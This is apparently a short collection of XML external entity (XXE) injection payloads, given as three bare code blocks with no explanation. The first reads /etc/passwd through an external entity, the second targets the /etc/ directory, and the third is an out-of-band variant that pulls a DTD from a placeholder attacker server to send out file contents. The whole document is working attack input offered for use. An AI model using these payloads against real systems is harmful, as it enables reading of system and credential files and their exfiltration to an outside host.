
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>

```


```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```


```xml
<!DOCTYPE root [
	<!ENTITY % content SYSTEM "illegal.txt">
	<!ENTITY % dtd SYSTEM "http://attackerserver/readillegal.dtd">
 	%dtd;
]>
<root> &filecontent; </root>
```


